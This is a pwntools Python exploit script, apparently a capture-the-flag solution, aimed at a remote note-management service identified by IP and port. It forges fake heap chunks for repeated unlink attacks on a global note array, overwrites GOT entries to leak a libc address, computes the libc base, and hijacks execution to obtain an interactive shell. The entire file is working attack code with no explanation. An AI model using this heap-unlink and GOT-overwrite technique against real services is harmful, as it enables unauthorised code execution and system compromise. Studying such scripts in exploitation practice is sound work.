from pwn import *
import base64
def create(idx,name):
	r.sendline('1')
	r.recvuntil("Which? :")
	r.sendline(str(idx))
	r.recvuntil("msg:")
	r.sendline(name)
	r.recvuntil("Which? :")
def edit(idx,name):
	r.sendline('2')
	r.recvuntil("Which? :")
	r.sendline(str(idx))
	r.recvuntil("msg:")
	r.sendline(name)
	r.recvuntil("Which? :")
def delete(idx):
	r.sendline('3')
	r.recvuntil("Which? :")
	r.sendline(str(idx))
	r.recvuntil("Which? :")
#r = process("d")
r = remote('47.75.154.113', 9999)

note = 0x0602180
puts_plt = 0x400770
free_got = 0x602018
puts_got = 0x602020
atoi_got = 0x602068 
atoi_plt = 0x0400800 
_dl_resolve = 0x602010
strlen_got = 0x602028 

offset_dl_resolve = 0x3e1870
offset_puts = 0x6f690
offset_system = 0x45390
offset_atoi = 0x36e80
offset_gadget = 0x45216
offset_strlen = 0x000000000008b720

raw_input("?")
print r.recvuntil("Which? :")
create(0,base64.b64encode('a'*4))
create(1,base64.b64encode('a'*4))
create(2,base64.b64encode('a'*4))
create(3,'QUFBQQUFBQQUFBQQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')
create(4,base64.b64encode('B'*0xf0))
payload = '\x00'*8 + p64(0x81)
payload += p64(note) + p64(note+8)
payload += '\x00'*0x60
payload += p64(0x80)
edit('3',payload)
delete(4)
create(4,'QUFBQQUFBQQUFBQQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')
create(5,base64.b64encode('B'*0xf0))
payload = '\x00'*8 + p64(0x81)
payload += p64(note+8) + p64(note+0x10)
payload += '\x00'*0x60
payload += p64(0x80)
edit('4',payload)
delete(5)
create(5,'QUFBQQUFBQQUFBQQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')
create(6,base64.b64encode('B'*0xf0))
payload = '\x00'*8 + p64(0x81)
payload += p64(note+0x10) + p64(note+0x18)
payload += '\x00'*0x60
payload += p64(0x80)
edit('5',payload)
delete(6)
create(6,'QUFBQQUFBQQUFBQQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')
create(7,base64.b64encode('B'*0xf0))
payload = '\x00'*8 + p64(0x81)
payload += p64(note+0x18) + p64(note+0x20)
payload += '\x00'*0x60
payload += p64(0x80)
edit('6',payload)
delete(7)
edit(4,p64(free_got))
edit(1,p64(puts_plt))
edit(3,p64(strlen_got))
r.sendline('3')
r.recvuntil("Which? :")
r.sendline(str(0))
r.recvuntil("Which? :")
strlen =  u64(r.recvuntil("Which? :").split("\n")[0]+"\x00\x00")
libc = strlen - offset_strlen
system = libc + offset_gadget
dl_resolve = libc + offset_dl_resolve

log.info("strlen: %#x",strlen)
log.info("libc: %#x",libc)
log.info("system: %#x",system)
log.info("dl_resolve: %#x",dl_resolve)

create(0,base64.b64encode('B'*8))
raw_input("?")
edit(5,p64(_dl_resolve)[:3])
edit(2,p64(0x303031))
edit(3,p64(strlen_got))
edit(0,p64(atoi_plt))
r.sendline('2')
r.recvuntil("Which? :")
r.sendline(str(2))
r.recvuntil("msg:")
r.sendline(p64(dl_resolve)+p64(system)*2)
r.interactive()